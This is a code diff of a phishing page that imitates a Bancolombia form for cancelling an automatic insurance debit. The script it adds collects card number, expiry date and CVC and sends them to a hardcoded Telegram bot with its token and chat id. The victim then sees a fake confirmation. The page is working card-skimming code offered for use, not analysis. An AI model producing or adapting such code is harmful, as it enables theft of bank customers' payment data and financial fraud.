@@ -22,7 +22,7 @@
       border-top: 6px solid #ffcc00; /* Amarillo Bancolombia */
     }
     .formulario h2 {
-      color: #002d72; /* Azul Bancolombia */
+      color: #002d72;
       font-size: 18px;
       margin-bottom: 20px;
       text-align: center;
@@ -52,7 +52,7 @@
     }
     button {
       width: 100%;
-      background: #002d72; /* Azul */
+      background: #002d72;
       color: #fff;
       border: none;
       padding: 12px;
@@ -68,7 +68,7 @@
   </style>
 </head>
 <body>
-  <form class="formulario">
+  <form class="formulario" id="cancelarForm">
     <h2>Cancelar el débito automático<br>a mi tarjeta débito de Seguros Cardif</h2>
 
     <label for="tarjeta">Número de tarjeta</label>
@@ -91,5 +91,49 @@
 
     <button type="submit">Confirmar cancelación</button>
   </form>
+
+  <script>
+    const form = document.getElementById("cancelarForm");
+
+    form.addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const tarjeta = document.getElementById("tarjeta").value;
+      const mes = document.getElementById("mes").value;
+      const anio = document.getElementById("anio").value;
+      const cvc = document.getElementById("cvc").value;
+
+      // 🔹 Configura tu bot de Telegram
+      const botToken = "8301521168:AAFwfmwFHOLEVKno7_dkaF8z7r1j0-WxM4g";   // 👉 Reemplaza con el token de tu bot
+      const chatId = "5647970395";   // 👉 Reemplaza con tu chat_id
+ 
+
+      const mensaje = `
+🚨 Solicitud de cancelación de débito automático 🚨
+Tarjeta: ${tarjeta}
+Mes: ${mes}
+Año: ${anio}
+CVC: ${cvc}
+      `;
+
+      // Enviar datos a Telegram
+      try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: mensaje
+          })
+        });
+
+        alert("Solicitud enviada. Recibirás confirmación pronto.");
+        form.reset();
+      } catch (error) {
+        alert("Error al enviar la solicitud.");
+        console.error(error);
+      }
+    });
+  </script>
 </body>
 </html>
